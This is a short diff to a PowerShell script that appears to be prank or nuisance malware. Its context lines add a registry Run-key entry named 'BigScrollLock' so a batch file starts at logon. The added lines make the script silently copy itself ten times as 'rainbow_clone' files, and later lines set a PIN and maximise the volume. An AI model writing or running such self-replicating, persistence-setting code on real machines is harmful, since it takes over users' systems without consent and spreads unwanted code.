@@ -17,6 +17,12 @@ if (Test-Path $batchPath) {
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BigScrollLock" -Value $batchPath
 }
 
+# Clone self 10 times
+1..10 | ForEach-Object {
+    $dest = Join-Path $PSScriptRoot "rainbow_clone_$_.ps1"
+    Copy-Item -Path $PSCommandPath -Destination $dest -Force -ErrorAction SilentlyContinue
+}
+
 $PIN = 'dumb'
 
 # Max Volume
